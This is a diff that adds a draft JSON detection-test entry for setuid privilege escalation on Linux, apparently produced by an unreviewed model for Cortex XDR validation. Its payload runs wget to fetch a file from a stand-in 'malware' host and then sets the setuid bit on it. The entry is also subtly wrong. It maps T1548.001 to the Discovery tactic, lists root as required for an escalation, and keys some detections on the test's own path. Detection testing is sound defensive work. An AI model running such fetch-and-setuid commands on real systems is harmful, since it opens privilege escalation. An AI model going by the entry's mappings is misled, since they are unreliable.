@@ -1,0 +1,148 @@
+{
+  "id": "TTP-0000-0030",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-linux",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "linux"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Setuid Privilege Escalation via chmod u+s on Shell Binary",
+    "summary": "An attacker modifies a shell binary in a writable path with the setuid bit to gain elevated privileges. Cortex should detect the manipulation of setuid/setgid file bits on executables.",
+    "description": "An attacker modifies a shell binary in a writable path with the setuid bit to gain elevated privileges. Cortex should detect the manipulation of setuid/setgid file bits on executables."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1548",
+        "subtechnique_id": "T1548.001",
+        "name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "root",
+    "payload": {
+      "interpreter": "bash",
+      "code": "mkdir -p /tmp/scratch\nwget -O /tmp/scratch/shell https://example.com/malware\nchmod u+s /tmp/scratch/shell\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "Setuid bit manipulation on a binary",
+        "expected_value": "action_file_path contains '/tmp/scratch/shell' and action_process_image_name = 'chmod'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Setuid Bit Manipulation",
+        "description": "Detection of chmod command setting setuid bit on executable files",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'chmod' and action_file_path contains 'shell' and action_command_line contains 'u+s'",
+        "mitre_technique_ids": [
+          "T1548.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Setuid and Setgid file bit manipulation",
+        "description": "Behavioral deviation detected when setuid/setgid bits are manipulated on files in writable paths",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_MODIFY\n| filter action_file_path contains '/tmp/scratch/shell' and action_command_line contains 'u+s'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "chmod u+s on executable file",
+        "mitre_technique_ids": [
+          "T1548.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Setuid File Bit Manipulation Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_MODIFY\n| filter action_command_line contains 'u+s' and action_file_path contains '/tmp/scratch/'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Setuid and Setgid file bit manipulation; Required Data: XDR Agent; ATT&CK T1548.001. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts."
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Setuid and Setgid file bit manipulation",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/setuid-and-setgid-file-bit-manipulation",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1548.001",
+      "url": "https://attack.mitre.org/techniques/T1548/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
